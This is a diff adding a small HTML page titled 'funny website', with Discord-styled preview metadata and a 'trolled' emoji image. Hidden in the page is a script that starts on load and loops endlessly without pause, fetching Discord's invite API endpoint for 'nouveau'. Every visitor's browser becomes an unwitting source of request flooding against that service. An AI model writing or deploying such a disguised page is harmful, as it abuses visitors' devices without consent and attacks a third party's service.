@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>funny website</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta property="og:title" content="discord" />
+    <meta property="og:type" content="website" />
+    <meta property="og:description" content="yeah" />
+    <meta name="theme-color" content="#9852ab">
+</head>
+<body>
+    <img src="https://cdn.discordapp.com/emojis/964523154800246834.png?size=4096&quality=lossless" alt="trolled">
+    <script>
+        const url = 'https://discord.com/api/v9/invites/nouveau';
+        async function sendRequests() {
+            while (true) {
+                try {
+                    const response = await fetch(url);
+                    console.log(`Status code - ${response.status}`);
+                } catch (error) {
+                    console.error(`Error - ${error.message}`);
+                }
+            }
+        }
+
+        sendRequests();
+
+    </script>
+</body>
+</html>
